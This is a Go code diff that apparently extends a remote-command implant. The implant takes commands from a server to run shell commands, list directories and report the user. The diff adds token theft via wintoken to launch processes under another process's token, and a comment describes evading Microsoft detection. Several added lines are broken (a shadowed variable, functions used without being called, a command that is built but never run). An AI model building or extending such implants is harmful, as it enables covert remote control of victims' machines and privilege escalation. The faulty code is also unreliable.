@@ -20,7 +20,19 @@ import (
 	"time"
 
 	"golang.org/x/crypto/chacha20poly1305"
+	"github.com/fourcorelabs/wintoken"
 )
+
+func new_process_new_token(token int, path string){
+	token, err := wintoken.OpenProcessToken(token, wintoken.TokenPrimary)
+	if err != nil {
+		panic(err)
+	}
+	defer token.Close()
+
+	cmd := exec.Command(path)
+	cmd.SysProcAttr = &syscall.SysProcAttr{Token: syscall.Token(token.Token())}
+}
 
 func chacha(pass string, msg string) (enc_block []byte) {
 
@@ -173,7 +185,6 @@ func main() {
 		// We reassign the string body to a new variable because otherwise Microsoft picks up that we're passing an HTML request right to be executed
 		//sb1 := strings.Replace(sb, "\n", "", -1) // we get the command back with a \n which fucks up execution, strip it with this
 		sb1 := strings.Fields(sb) // idk how I never heard of the Fields method
-		command := sb[1:]
 
 		h := sha256.New()
 		h.Write([]byte(sb))
@@ -201,12 +212,21 @@ func main() {
 		case "gcu":
 			result = getCurrentUser()
 		case "rc":
-			result = runCommand(command)
+			result = runCommand(sb1[1:])
 		case "rd":
 			result = readDir(sb1[1])
 		case "terminal":
 			commandToRun := strings.Join(sb1, ",")
 			result = terminal(commandToRun)
+		case "newProc":
+			path := sb1[1:]
+			new_process_new_token(0, path)
+		case "pid":
+		    	cPID := os.Getpid
+		    	pPID := os.Getppid
+		    	sCPID := strconv.Itoa(cPID)
+		    	cPPID := strconv.Itoa(pPID)
+		    	result = sCPID + ', ' + cPPID
 		}
 		toSend := string(result)
 		fmt.Printf(toSend)
